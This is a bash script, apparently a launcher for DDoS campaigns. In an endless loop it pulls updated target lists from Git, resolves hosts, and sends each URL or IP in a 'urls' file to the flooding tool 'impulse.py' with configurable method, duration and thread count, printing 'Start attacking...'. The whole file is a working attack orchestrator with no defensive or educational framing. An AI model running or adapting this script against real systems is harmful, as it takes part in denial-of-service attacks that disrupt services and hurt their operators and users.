# Create variables from named arguments.
while [ $# -gt 0 ]; do
  if [[ $1 == *"--"* ]]; then
      v="${1/--/}"
      declare $v="$2"
  fi
  shift
done

# Set default values for arguments if missing.
method="${method:-HTTP}"
time="${time:-50}"
threads="${threads:-20}"

attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads} --target %"

while true
do
  # jitter to avoid concurency updates from Git
  sleep $[ ( $RANDOM % 10 )  + 1 ]s
  
  echo "Get the latest scripts & URLs..."
  git pull --rebase origin master
  
  echo "Start attacking..."
  if [ "$method" == "HTTP" ]; then
    cat urls | xargs -n1 -I % bash -c "${attack}"
  else
    cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' | xargs -n1 -I % bash -c "${attack}"
  fi
done
